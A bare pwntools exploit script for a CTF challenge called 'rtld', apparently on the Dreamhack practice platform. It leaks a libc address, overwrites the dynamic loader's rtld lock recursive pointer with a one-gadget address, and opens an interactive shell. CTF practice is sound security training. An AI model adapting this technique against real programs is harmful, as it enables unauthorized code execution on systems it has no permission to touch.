from pwn import *
import sys

context.log_level='debug'

if len(sys.argv)!=2:
    log.info("try 'python ex.py -l' for local")
    log.info("try 'python ex.py -r' for remote")
    exit(0)

if sys.argv[1]=="-r":
    p = remote('host1.dreamhack.games',17239)
elif sys.argv[1]=="-l":
    p = process('rtld')
else:
    log.info("options: -l for local, -r for remote")
    exit(0)

e=ELF('./rtld')
libc=e.libc

# Offsets
stdout_offset=libc.symbols['_IO_2_1_stdout_']
ld_offset=0x3ca000
rtld_offset=0x226040
onegadget_offset=0xf1147


p.recvuntil("stdout: ")

stdout_address=int(p.recvuntil("\n").strip("\n"),16)
libc_base=stdout_address-stdout_offset
ld_base=libc_base+ld_offset
onegadget_address=libc_base+onegadget_offset
rtld_lock_recursive=ld_base+rtld_offset+3848

log.info("libc_base: {}".format(hex(libc_base)))
log.info("rtld_lock_recursive: {}".format(hex(rtld_lock_recursive)))
log.info("onegadget address: {}".format(hex(onegadget_address)))

p.sendlineafter("addr: ",str(rtld_lock_recursive))
p.sendlineafter("value: ",str(onegadget_address))

p.interactive()